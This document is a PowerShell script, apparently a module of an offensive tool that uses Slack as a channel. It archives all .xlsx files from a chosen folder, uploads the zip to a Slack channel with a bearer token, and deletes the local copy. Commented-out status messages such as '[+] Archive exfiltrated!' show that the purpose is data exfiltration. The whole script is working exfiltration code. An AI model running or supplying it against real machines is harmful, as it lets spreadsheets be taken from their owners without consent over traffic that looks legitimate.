param(
    [Parameter(Mandatory = $true)]
    [string]$edest,

    [Parameter(Mandatory = $true)]
    [string]$eout,

    [switch]$u,

    [string]$threadTs
)

# archive all .xlsx files from a specific fodler to a dest folder
function archive {
    param(
        [string]$source,
        [string]$output
    )

    if (-not [System.IO.Directory]::Exists($source)) {
        throw "Source directory does not exist"
    }

    if (-not [System.IO.Directory]::Exists($output)) {
        [System.IO.Directory]::CreateDirectory($output) | Out-Null
    }

    $files = [System.IO.Directory]::GetFiles($source, "*.xlsx", [System.IO.SearchOption]::TopDirectoryOnly)

    if ($files.Count -eq 0) {
        throw "No .xlsx files found in source folder"
    }

    $zipPath = [System.IO.Path]::Combine($output, "$([DateTime]::Now.ToString('yyyyMMdd_HHmmss')).zip")

    Compress-Archive -LiteralPath $files -DestinationPath $zipPath -Force
    return $zipPath
}

# converts the archive to base64 and posts it to Slack via webhook
function upload {
    param(
        [string]$filePath,
        [string]$threadTs
    )

    if (-not [System.IO.File]::Exists($filePath)) {
        throw "File does not exist"
    }

    $fileInfo = [System.IO.FileInfo]::new($filePath)
    $fileName = [System.IO.Path]::GetFileName($fileInfo)
    $fileBytes = [System.IO.File]::ReadAllBytes($fileInfo)

    $headers = @{
        Authorization = "Bearer $slackToken"
    }

    # generate upload url
    $body_gen = @{
        filename = $fileName
        length   = $fileBytes.Length
    }

    $uploadInfo = Invoke-RestMethod -Uri "https://slack.com/api/files.getUploadURLExternal" -Method Post -Headers $headers -ContentType "application/x-www-form-urlencoded" -Body $body_gen

    if (-not $uploadInfo.ok) {
        throw "Slack error: $($uploadInfo.error)"
    }

    # upload file bytes
    Invoke-WebRequest -Uri $uploadInfo.upload_url -Method Post -ContentType "application/octet-stream" -Body $fileBytes | Out-Null

    # finish the upload and send in channel
    $bodyFinalData = @{
        files = @(
            @{
                id    = $uploadInfo.file_id
                title = $fileName
            }
        )
        channel_id      = $channelId
        initial_comment = ":package: Archive:"
    }

    if ($threadTs) {
        $bodyFinalData.thread_ts = $threadTs
    }

    $body_final = $bodyFinalData | ConvertTo-Json -Depth 5 -Compress

    $complete = Invoke-RestMethod -Uri "https://slack.com/api/files.completeUploadExternal" -Method Post -Headers $headers -ContentType "application/json; charset=utf-8" -Body $body_final

    if (-not $complete.ok) {
        throw "Slack error: $($complete.error)"
    }

    [System.IO.File]::Delete($FilePath)
}

try {
    $zip = archive -Source $edest -Output $eout
    #slack-wrapper "[+] Archive created: ``$zip``"

    if ($u) {
        $result = upload -FilePath $zip -threadTs $threadTs
        #$result
        #slack-wrapper "[+] Archive exfiltrated!"
    }

}
catch {
    #"ERROR: $($_.Exception.Message)"
    #exit 1
    #Write-Error $_
    #Write-Error $_.ScriptStackTrace
    throw
}
